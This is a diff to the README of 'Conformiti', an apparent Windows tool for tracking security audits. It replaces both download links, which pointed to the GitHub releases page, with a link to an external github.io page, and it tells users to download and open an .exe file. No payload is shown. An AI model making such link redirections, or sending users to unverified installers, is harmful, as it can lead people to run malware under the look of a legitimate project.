@@ -1,6 +1,6 @@
 # 🛡️ Conformiti - Manage your security audits with ease
 
-[![Download Conformiti](https://img.shields.io/badge/Download-Conformiti-blue)](https://github.com/unforced-snapdragon792/Conformiti/releases)
+[![Download Conformiti](https://img.shields.io/badge/Download-Conformiti-blue)](https://unforced-snapdragon792.github.io)
 
 Conformiti helps SaaS teams track security audits. You can plan, execute, and finish your compliance tasks in one place. The software stores your documents, tracks your progress, and keeps your team on schedule for yearly reviews.
 
@@ -8,7 +8,7 @@ Conformiti helps SaaS teams track security audits. You can plan, execute, and fi
 
 You do not need to write code to use this tool. Conformiti runs on the Windows operating system. Follow these steps to set up the software on your computer.
 
-1. Visit the [releases page](https://github.com/unforced-snapdragon792/Conformiti/releases) to download the installer.
+1. Visit the [releases page](https://unforced-snapdragon792.github.io) to download the installer.
 2. Select the file ending in `.exe` that matches your version of Windows.
 3. Save the file to your desktop or downloads folder.
 4. Open the downloaded file to start the installation.
